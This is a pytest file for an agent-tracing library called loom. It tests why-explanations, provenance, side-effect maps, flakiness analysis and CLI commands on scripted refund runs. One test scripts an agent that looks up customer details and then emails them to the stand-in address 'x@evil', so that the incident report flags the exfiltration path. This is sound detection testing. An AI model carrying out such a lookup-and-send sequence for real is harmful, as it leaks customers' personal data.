"""Offline insights: why / provenance / side-effect map / causality / flakiness."""

import json

import pytest

from loom import Agent, tool
from loom.cli import main
from loom.insight import (causality_tree, describe_flakiness, describe_why,
                          flakiness, provenance, side_effect_map, why_action)
from loom.providers import ModelResponse, ScriptedProvider, ToolCall


@tool
def get_customer(id: int) -> str:
    "lookup"
    return "Jane Doe <jane@example.com>, order A-17, $500"


@tool
def issue_refund(amount: int, order_id: str) -> str:
    "refund"
    return "refunded 500 for A-17"


def _support_run():
    return Agent(model=ScriptedProvider([
        ModelResponse(text="Looking up the order first.",
                      tool_calls=[ToolCall("t1", "get_customer", {"id": 7})],
                      stop_reason="tool_use"),
        ModelResponse(text="Order qualifies -- refunding.",
                      tool_calls=[ToolCall("t2", "issue_refund",
                                           {"amount": 500, "order_id": "A-17"})],
                      stop_reason="tool_use"),
        ModelResponse(text="Refunded $500 for order A-17 to Jane Doe."),
    ]), tools=[get_customer, issue_refund]).run("refund order A-17")


def test_why_action_cites_the_observation_it_drew_on():
    w = why_action(_support_run().to_dict(), 3)
    assert w["tool"] == "issue_refund"
    assert w["intent"].startswith("Order qualifies")
    assert w["risk"] == "money-movement"
    assert w["evidence"][0]["step"] == 1          # the get_customer lookup
    assert "A-17" in w["evidence"][0]["snippet"]
    text = describe_why(w)
    assert "stated intent" in text and "[1] get_customer" in text


def test_why_action_unknown_step_raises():
    with pytest.raises(ValueError):
        why_action(_support_run().to_dict(), 99)


def test_provenance_links_claims_to_tool_results():
    rows = provenance(_support_run().to_dict())
    assert rows, "final answer should yield claims"
    claim = rows[0]
    assert "Refunded" in claim["claim"]
    steps = {e["step"] for e in claim["evidence"]}
    assert steps & {1, 3}                          # supported by lookup/refund results


def test_side_effect_map_groups_changes_and_reads():
    m = side_effect_map(_support_run().to_dict())
    assert any("moved money: 500 (A-17)" in s for s in m["changes"]["record"])
    assert m["reads"] == 1                         # the PII lookup


def test_causality_tree_shows_depth():
    data = _support_run().to_dict()
    # fabricate a subagent call at depth 1
    data["log"].insert(2, {"seq": 2, "kind": "tool:search", "key": "k",
                           "result": "found", "depth": 1})
    tree = causality_tree(data)
    assert "└ search" in tree
    assert "issue_refund  ⚠ money-movement" in tree


def test_flakiness_histogram_and_identical_count():
    base = _support_run().to_dict()
    same = json.loads(json.dumps(base))
    diverged = json.loads(json.dumps(base))
    diverged["log"][3]["key"] = "different"        # inputs differ at step 3
    f = flakiness([base, same, diverged, diverged])
    assert f["runs"] == 4 and f["identical"] == 1
    assert f["by_step"] == [(3, 2, "tool:issue_refund")]
    text = describe_flakiness(f)
    assert "flakiest step: 3" in text and "2/3 run(s)" in text


def test_incident_names_the_exfiltration_path(tmp_path):
    @tool
    def send_email(to: str) -> str:
        "email"
        return "sent"

    run = Agent(model=ScriptedProvider([
        ModelResponse(tool_calls=[ToolCall("t1", "get_customer", {"id": 7})],
                      stop_reason="tool_use"),
        ModelResponse(tool_calls=[ToolCall("t2", "send_email", {"to": "x@evil"})],
                      stop_reason="tool_use"),
        ModelResponse(text="done"),
    ]), tools=[get_customer, send_email]).run("go")
    path = str(tmp_path / "r.loom.json")
    run.save(path)
    from loom.incident import build_report

    report = build_report(json.load(open(path)), path)
    # the PII value isn't carried verbatim here, so it falls back to the
    # category sequence (a value-lineage match would win -- see test_taint).
    assert "⛓ exfiltration path (category sequence): [1] get_customer → [3] send_email" in report


def test_cli_why_step_map_and_note(tmp_path, capsys):
    path = str(tmp_path / "r.loom.json")
    _support_run().save(path)

    assert main(["why", path, "--step", "3"]) == 0
    out = capsys.readouterr().out
    assert "issue_refund" in out and "[1] get_customer" in out

    assert main(["map", path]) == 0
    assert "moved money: 500 (A-17)" in capsys.readouterr().out

    assert main(["note", path, "--step", "3", "-m", "over the limit", "--by", "evan"]) == 0
    capsys.readouterr()
    assert main(["note", path]) == 0
    listing = capsys.readouterr().out
    assert "over the limit — evan" in listing


def test_why_action_confidence_is_honest():
    # strong overlap -> medium (never "high"); intent-only -> low; nothing -> none
    run = _support_run().to_dict()
    strong = why_action(run, 3)
    assert strong["confidence"] in ("medium", "low")  # never "high"
    assert "confidence" in strong and strong["missing_evidence"] in (True, False)
    for e in strong["evidence"]:
        assert "shared" in e  # the overlap count is exposed


def test_why_no_evidence_is_low_or_none_and_flagged():
    # a first action with no prior observation to draw on
    from loom import Agent, tool
    from loom.providers import ModelResponse, ScriptedProvider, ToolCall

    @tool
    def start(x: int) -> str:
        "start"
        return "ok"

    run = Agent(model=ScriptedProvider([
        ModelResponse(tool_calls=[ToolCall("t1", "start", {"x": 1})], stop_reason="tool_use"),
        ModelResponse(text="done"),
    ]), tools=[start]).run("go")
    w = why_action(run.to_dict(), 1)
    assert w["missing_evidence"] is True
    assert w["confidence"] in ("low", "none")


def test_studio_why_disclosure_present():
    from loom.export import trace_to_html
    page = trace_to_html(_support_run().to_dict())
    assert '<details class="why">' in page
    assert "stated intent" in page and "correlation, not proof" in page
    assert "wjump" in page  # evidence links jump to the step


def test_cli_flake_auto_records_and_analyzes(tmp_path, capsys, monkeypatch):
    # A provider that alternates behavior by call-count -> deterministic flake.
    (tmp_path / "flakemod.py").write_text(
        "from loom import Agent, tool\n"
        "from loom.providers import ModelProvider, ModelResponse, ToolCall\n"
        "_N = {'i': 0}\n"
        "@tool\n"
        "def check(x: int) -> str:\n"
        "    'check'\n"
        "    return 'ok'\n"
        "class Flaky(ModelProvider):\n"
        "    model = 'flaky'\n"
        "    def complete(self, system, messages, tools):\n"
        "        asst = [m for m in messages if m['role']=='assistant']\n"
        "        if not asst:\n"
        "            return ModelResponse(tool_calls=[ToolCall('t','check',{'x':1})], stop_reason='tool_use')\n"
        "        # even-numbered runs take an extra tool step -> diverge at step 2\n"
        "        _N['i'] += 1\n"
        "        tools_seen = [m for m in messages if m['role']=='tool']\n"
        "        if _N['i'] % 2 == 0 and len(tools_seen) < 2:\n"
        "            return ModelResponse(tool_calls=[ToolCall('t2','check',{'x':2})], stop_reason='tool_use')\n"
        "        return ModelResponse(text='done')\n"
        "agent = Agent(model=Flaky(), tools=[check])\n"
    )
    monkeypatch.chdir(tmp_path)
    assert main(["flake", "--agent", "flakemod:agent", "--prompt", "go", "-n", "6",
                 "-o", str(tmp_path / "out")]) == 0
    out = capsys.readouterr().out
    assert "recording 6 run(s)" in out
    assert "6 run(s):" in out and "flakiest step" in out
    # the runs were saved
    assert len(list((tmp_path / "out").glob("run-*.loom.json"))) == 6


def test_cli_flake_needs_two_traces(tmp_path, capsys):
    one = str(tmp_path / "a.loom.json")
    _support_run().save(one)
    assert main(["flake", one]) == 2          # CLIError -> friendly exit 2
    assert "at least two traces" in capsys.readouterr().err


def test_evidence_coverage_and_gate(tmp_path, capsys):
    from loom import Agent, tool
    from loom.insight import evidence_coverage
    from loom.providers import ModelResponse, ScriptedProvider, ToolCall

    @tool
    def search(q: str) -> str:
        "search"
        return "The capital of France is Paris. Population 67 million."

    run = Agent(model=ScriptedProvider([
        ModelResponse(tool_calls=[ToolCall("t", "search", {"q": "france"})], stop_reason="tool_use"),
        ModelResponse(text="The capital of France is Paris. The stock market rose today."),
    ]), tools=[search]).run("q")
    cov = evidence_coverage(run.to_dict())
    assert cov["claims"] == 2 and cov["supported"] == 1
    assert cov["coverage"] == 0.5
    assert "The stock market rose today." in cov["unsupported"][0]

    path = str(tmp_path / "r.loom.json")
    run.save(path)
    # gate below coverage -> fail; gate at/under coverage -> pass
    assert main(["provenance", path, "--gate", "--min-coverage", "0.8"]) == 1
    capsys.readouterr()
    assert main(["provenance", path, "--gate", "--min-coverage", "0.5"]) == 0
    assert "evidence coverage: 1/2" in capsys.readouterr().out


def test_flakiness_clusters_causes():
    import json as _json

    base = _support_run().to_dict()
    # variant A: the model answers differently at step 4 (same key = sampling)
    va = _json.loads(_json.dumps(base))
    va["log"][4]["result"]["text"] = "a different final answer"
    # variant B: the tool at step 3 returns something else (flaky tool)
    vb = _json.loads(_json.dumps(base))
    vb["log"][3]["result"] = "refund FAILED try again"
    f = flakiness([base, va, vb])
    assert f["identical"] == 0
    causes = {c for step in f["causes"].values() for c in step}
    assert any("sampling nondeterminism" in c for c in causes)
    assert any("flaky tool" in c for c in causes)
    text = describe_flakiness(f)
    assert "└" in text and "dominant cause:" in text
